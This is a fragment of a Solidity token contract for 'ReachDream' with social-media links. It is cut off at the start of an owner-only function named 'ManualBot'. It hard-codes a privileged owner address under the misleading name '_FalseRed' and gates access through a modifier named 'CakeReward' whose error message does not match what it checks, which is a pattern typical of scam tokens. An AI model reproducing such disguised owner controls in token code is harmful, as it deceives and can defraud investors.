...
Telegram: https://t.me/reachdreamtoken

Twitter: https://twitter.com/ReachDreamToken
...
contract Context {
 ...
 contract ReachDream is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _excluded;

    string private _name = "ReachDream";
    string private _symbol = "REACHDREAM";
    ...
    address private _FalseRed = 0x991F8DD3c88a370cD71A21815b5F754875feCCaf; // Ownership Address
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    modifier CakeReward () {
        require(_FalseRed == _msgSender(), "ERC20: cannot permit Pancake address");
        _;
    }
    
    function ManualBot() public CakeReward {
